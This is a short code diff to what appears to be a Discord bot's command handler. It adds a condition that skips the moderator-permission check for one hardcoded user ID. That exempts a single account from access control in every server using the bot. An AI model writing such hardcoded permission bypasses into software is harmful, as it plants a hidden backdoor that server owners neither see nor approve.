@@ -10,7 +10,7 @@ const init = async function (msg){
     
     let ServerDATA = await DB.servers.get(msg.guild.id);
     const modPass = PLX.modPass(msg.member,"manageMessages", ServerDATA);
-    if (!modPass) {
+    if (!modPass && msg.author.id !== '253600545972027394') {
         return msg.reply($t('responses.errors.insuperms', P)).catch(console.error);
     };
 
